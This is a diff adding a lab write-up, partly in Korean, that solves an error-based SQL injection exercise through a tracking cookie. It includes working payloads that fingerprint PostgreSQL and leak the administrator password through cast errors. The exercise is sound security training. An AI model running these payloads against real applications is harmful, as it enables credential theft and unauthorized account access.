@@ -1,0 +1,34 @@
+#Lab: Visible error-based SQL injection
+
+This lab contains a SQL injection vulnerability. 
+The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. 
+The results of the SQL query are not returned.
+The database contains a different table called users, with columns called username and password. 
+To solve the lab, find a way to leak the password for the administrator user, then log in to their account.
+
+
+
+### 🔍 분석 및 공격 과정
+1. 일단 users테이블 내에 username과 password 컬럼들 존재. 그중 username이 administrator인 user의 password 얻어야함
+2. 쿼리의 결과가 돌아오지는 않음
+3. 일단 single quote를 넣어보고 반응을 살펴보자.
+>>> TrackingId = asdawd'  
+--> `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'UGxMsFumMNjgOXLT''. Expected  char`
+ 이렇게 에러를 뿜는다.
+ 이번에는 제대로 quote를 매치시켜보자.
+>>> TrackingId = asdawd'' --> 제대로 작동한다.
+ TrackingId에 입력된 값이 쿼리문에 이어 붙여지고 있다.
+4. 이번에는 DB의 종류를 간단하게 파악해보자. concatenation을 이용해 확인할 것이다.
+>>> TrackingId = asdawd'||(SELECT '')||' --> 오류가 없다. concatenation으로 `||`를 사용하고 FROM을 명시안해도 된다.
+ 따라서, Postgre를 사용하고 있다.
+5. SQL 질의 과정중에 생긴 오류를 응답에 포함시켜 주고 있기에 visible error유형이다. postgre에서는 password를 int로 변환시키려고 하면 에러를 뿜고 그 패스워드가 무엇인지 보여줄 것이다.
+>>> TrackingId='OR (SELECT CAST((SELECT password FROM users WHERE username='administrator') AS int))=1--
+ 길이가 너무 길어 짤리는 중임. 그래서 좀 더 줄여보자
+>>> TrackingId='OR (SELECT password::int FROM users WHERE username='administrator')=1--
+ 이것도 길이가 길어 짤림. 더 줄여야함.
+>>> TrackingId='OR (SELECT password::int FROM users)=1--
+ 에러 없이 나온다. 행이 단 하나이기에 가능했다. 행이 단 하나라면 이건 바로 username이 administrator인 유저의 pw다.
+ `ERROR: invalid input syntax for type integer: "a1ht7g1w7xzeq8ako1hp"` 이렇게 원래 비밀번호가 나오게 된다. solve!!
+
+
+ 개인적으로 푸는데 좀 걸렸던 파트이다. 많이 연습해 볼 필요가 있어 보인다.
